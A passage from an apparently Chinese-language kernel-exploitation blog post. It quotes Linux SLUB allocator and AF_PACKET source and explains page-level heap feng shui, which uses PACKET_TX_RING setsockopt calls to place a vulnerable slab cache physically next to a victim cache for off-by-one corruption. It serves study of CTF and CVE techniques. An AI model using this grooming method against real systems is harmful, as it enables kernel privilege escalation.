class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Allocation may have failed due to fragmentation.</span></span><br><span class="line"><span class="comment"> * Try a lower order alloc if possible</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">stat(s, ORDER_FALLBACK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slab-&gt;objects = oo_objects(oo);</span><br><span class="line">slab-&gt;inuse = <span class="number">0</span>;</span><br><span class="line">slab-&gt;frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">account_slab(slab, oo_order(oo), s, flags);</span><br><span class="line"></span><br><span class="line">slab-&gt;slab_cache = s;</span><br><span class="line"></span><br><span class="line">kasan_poison_slab(slab);</span><br><span class="line"></span><br><span class="line">start = slab_address(slab);</span><br><span class="line"></span><br><span class="line">setup_slab_debug(s, slab, start);</span><br><span class="line"></span><br><span class="line">shuffle = shuffle_freelist(s, slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!shuffle) &#123;</span><br><span class="line">start = fixup_red_left(s, start);</span><br><span class="line">start = setup_object(s, start);</span><br><span class="line">slab-&gt;freelist = start;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="number">1</span>; idx++) &#123;</span><br><span class="line">next = p + s-&gt;size;</span><br><span class="line">next = setup_object(s, next);</span><br><span class="line">set_freepointer(s, p, next);</span><br><span class="line">p = next;</span><br><span class="line">&#125;</span><br><span class="line">set_freepointer(s, p, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对于新分配的slab首先写的就是他的<code>freelist</code>指针，所以根据上面外层函数的调用顺序来看，在刚挂载到<code>freelist</code>紧接着就会返回object并重新挂载到<code>partial</code>上。</p><p>也可以看到这个函数中调用了在slab分配分析开头给出的函数<code>alloc_slab_page</code>。</p><h2 id="页级堆风水构造"><a href="#页级堆风水构造" class="headerlink" title="页级堆风水构造"></a>页级堆风水构造</h2><p>终于要说到跟题目有关系的内容了。</p><p>如果提到一个驱动存在<code>off by null</code>或者<code>off by one</code>漏洞时，我的第一反应就是这个<a href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CVE-2021-22555</a>中的办法，使用大量堆喷来完成。但是如果题目的slab是由<code>kmem_cache_create_usercopy</code>创建的话困难就会存在很大的问题了，如果你当前使用堆喷的堆块的order与创建的cache不一致，这样只有极低的概率可以让驱动生成的slab紧邻堆喷的slab。所以为了提高脚本的稳定性，出现了这一利用手法。</p><p>其实这一手法以前在安全客中有看到但是当时并没有在意，所以现在借着墨晚鸢佬的博客学习一下。页级堆风水即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们手工构造一个新的已知的页级粒度内存页排布。</p><p>在上述解释完slab的分配过程想必应该都能理解<code>buddy system</code>了，他的基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理（偷的图）：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/79biltjNfACIZcP.gif"                      alt="偷"                ></p><p>不难想到这个利用方式的原理就是：从更高阶 order 拆分成的两份低阶 order 的连续内存页是物理连续的，由此我们可以：</p><ul><li>  向 buddy system 请求两份连续的内存页</li><li>  释放其中一份内存页，分配 <code>vulnerable kmem_cache</code> ，让其取走这份内存页</li><li>  释放另一份内存页，使用 <code>victim kmem_cache</code> 堆喷，让其取走这份内存页</li></ul><p>那么此时我们可以使用<code>vulnerable kmem_cache</code>的<code>off by null</code>或<code>off by one</code>去修改到<code>victim kmem_cache</code>了。</p><h3 id="分配任意数量任意大小page"><a href="#分配任意数量任意大小page" class="headerlink" title="分配任意数量任意大小page"></a>分配任意数量任意大小page</h3><p>根据上述内容来看，我们需要消耗掉小<code>order</code>的页面才能继续进行，这也就意味着我们需要一个可以申请指定<code>order</code>的API。这里选择是<a class="link"   href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html" >CVE-2017-7308<i class="fas fa-external-link-alt"></i></a>中的方法。</p><p>当我们创建一个 <code>protocol</code> 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1 </code>/ <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p><p><code>__sys_setsockopt</code>=&gt;<code>sock-&gt;ops-&gt;setsockopt</code>=&gt;<code>packet_setsockopt</code>=&gt;<code>packet_set_ring</code>=&gt;<code>alloc_pg_vec</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line"><span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">pg_vec = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到的是这里<code>alloc_pg_vec</code>函数通过<code>alloc_one_pg_vec_page</code>函数申请buffer。并且这里申请的数量为<code>req-&gt;tp_block_nr</code>而req是用户可控的，所以这里申请的数量是可控的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">alloc_one_pg_vec_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *buffer;</span><br><span class="line"><span class="keyword">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* complete and utter failure */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>alloc_one_pg_vec_page</code>函数使用<code>__get_free_pages</code>申请到page。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">packet_setsockopt(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">sockptr_t</span> optval,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (optname) &#123;</span><br><span class="line"><span class="keyword">case</span> PACKET_ADD_MEMBERSHIP:</span><br><span class="line"><span class="keyword">case</span> PACKET_DROP_MEMBERSHIP:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_mreq_max</span> <span class="title">mreq</span>;</span></span><br><span class="line"><span class="keyword">int</span> len = optlen;</span><br><span class="line"><span class="built_in">memset</span>(&amp;mreq, <span class="number">0</span>, <span class="keyword">sizeof</span>(mreq));</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="keyword">sizeof</span>(struct packet_mreq))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (len &gt; <span class="keyword">sizeof</span>(mreq))</span><br><span class="line">len = <span class="keyword">sizeof</span>(mreq);</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;mreq, optval, len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (len &lt; (mreq.mr_alen + offsetof(struct packet_mreq, mr_address)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (optname == PACKET_ADD_MEMBERSHIP)</span><br><span class="line">ret = packet_mc_add(sk, &amp;mreq);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_mc_drop(sk, &amp;mreq);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line"><span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">ret = -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">    optname == PACKET_TX_RING);</span><br><span class="line">&#125;</span><br><span class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">      ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到当我们的<code>optname</code>为<code>PACKET_TX_RING</code>时会调用到<code>packet_set_ring</code>，因为此时len的关系，我们还需要设置<code>po-&gt;tp_version</code>为<code>TPACKET_V1</code>/<code>TPACKET_V2</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PACKET_VERSION:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optlen != <span class="keyword">sizeof</span>(val))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (copy_from_sockptr(&amp;val, optval, <span class="keyword">sizeof</span>(val)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">switch</span> (val) &#123;</span><br><span class="line"><span class="keyword">case</span> TPACKET_V1:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V2:</span><br><span class="line"><span class="keyword">case</span> TPACKET_V3:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line">ret = -EBUSY;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">po-&gt;tp_version = val;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">release_sock(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要修改到<code>po-&gt;tp_version</code>需要进入到这个case，所以需要进行两次调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *rx_owner_map = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> was_running, order = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> *<span class="title">rb_queue</span>;</span></span><br><span class="line">__be16 num;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="comment">/* Added to avoid minimal code churn */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> *<span class="title">req</span> =</span> &amp;req_u-&gt;req;</span><br><span class="line"></span><br><span class="line">rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;</span><br><span class="line">rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;</span><br><span class="line"></span><br><span class="line">err = -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (!closing) &#123;</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (packet_read_pending(rb))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_frame_size;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">order = get_order(req-&gt;tp_block_size);</span><br><span class="line">pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">if</span> (closing || atomic_read(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line">spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">swap(rb-&gt;pg_vec, pg_vec);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;tp_version &lt;= TPACKET_V2)</span><br><span class="line">swap(rb-&gt;rx_owner_map, rx_owner_map);</span><br><span class="line">rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="number">1</span>);</span><br><span class="line">rb-&gt;head = <span class="number">0</span>;</span><br><span class="line">rb-&gt;frame_size = req-&gt;tp_frame_size;</span><br><span class="line">spin_unlock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line"></span><br><span class="line">swap(rb-&gt;pg_vec_order, order);</span><br><span class="line">swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);</span><br><span class="line"></span><br><span class="line">rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;</span><br><span class="line">po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?</span><br><span class="line">tpacket_rcv : packet_rcv;</span><br><span class="line">skb_queue_purge(rb_queue);</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">pr_err(<span class="string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,</span><br><span class="line">       atomic_read(&amp;po-&gt;mapped));</span><br><span class="line">&#125;</span><br><span class="line">  ... ...</span><br><span class="line">out_free_pg_vec:</span><br><span class="line"><span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">bitmap_free(rx_owner_map);</span><br><span class="line">free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的order是由<code>req-&gt;tp_block_size</code>确定的，而且req是用户可以控制的，所以这里的申请的page的order也是可控的。并且需要注意的是在<code>if (closing || atomic_read(&amp;po-&gt;mapped) == 0)</code>这个条件分支中，会交换<code>rb-&gt;pg_vec</code>中的内容和当前函数中变量<code>pg_vec</code>中的内容，所以在最后不会执行到<code>free_pg_vec</code>函数。</p><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p>这里的释放流程很简单：<code>packet_release</code>=&gt;<code>packet_set_ring</code>=&gt;<code>free_pg_vec</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_pg_vec</span><span class="params">(struct pgv *pg_vec, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (likely(pg_vec[i].buffer)) &#123;</span><br><span class="line"><span class="keyword">if</span> (is_vmalloc_addr(pg_vec[i].buffer))</span><br><span class="line">vfree(pg_vec[i].buffer);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">free_pages((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pg_vec[i].buffer,</span><br><span class="line">   order);</span><br><span class="line">pg_vec[i].buffer = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kfree(pg_vec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到就是将里面的内容给释放掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_release</span><span class="params">(struct socket *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_fanout</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sk)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">lock_sock(sk);</span><br><span class="line"><span class="keyword">if</span> (po-&gt;rx_ring.pg_vec) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易注意到的是都调用的<code>packet_set_ring</code>函数，而在<code>packet_release</code>函数中所给的参数中第三个参数为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br></pre></td></tr></table></figure><p>对比函数声明可以看出来这个参数就代表要关闭了，并且在执行这个函数之前<code>memset(&amp;req_u, 0, sizeof(req_u));</code>执行了这样一条语句，也就导致req中的所有内容都为<code>\x00</code>，也就不进入分配的分支中去了。不过依旧会进入到进行各种swap的分支，因为在分配时走过一次，所以这次最后会调用到<code>free_pg_vec</code>函数了，而这个函数在这里说了就是释放掉所有页面。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行 <code>setsockopt()</code> 便相当于获取到了一块近乎物理连续的内存（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 